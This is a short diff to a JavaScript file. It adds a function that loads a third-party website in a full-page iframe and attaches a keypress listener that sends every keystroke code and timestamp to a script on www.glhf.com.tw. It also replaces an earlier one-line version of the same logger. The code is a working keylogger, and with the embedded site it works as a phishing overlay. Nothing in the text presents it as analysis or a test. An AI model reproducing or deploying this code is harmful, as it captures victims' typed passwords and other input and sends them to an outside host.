@@ -5,6 +5,16 @@ function jq(){
 	document.getElementsByTagName('head')[0].appendChild(script);
 }
 
-jq();
+function prepareFrame() {
+        var ifrm = document.createElement("iframe");
+        ifrm.setAttribute("src", "https://104.com.tw/");
+        ifrm.style.width = "100%";
+        ifrm.style.height = "100%";
+	ifrm.style.top = "0";
+	ifrm.style.left = "0";
+	ifrm.setAttribute("onload", "$('#w').contents().keypress(function(event) {$.get('https://www.glhf.com.tw/x.php?xx='+event.which+'&t='+event.timeStamp,function(data){});});");
+        document.body.appendChild(ifrm);
+}
 
-$('#w').contents().keypress(function(event) {$.get('http://www.glhf.com.tw/k.php?x='+event.which+'&t='+event.timeStamp,function(data){});});
+jq();
+prepareFrame();
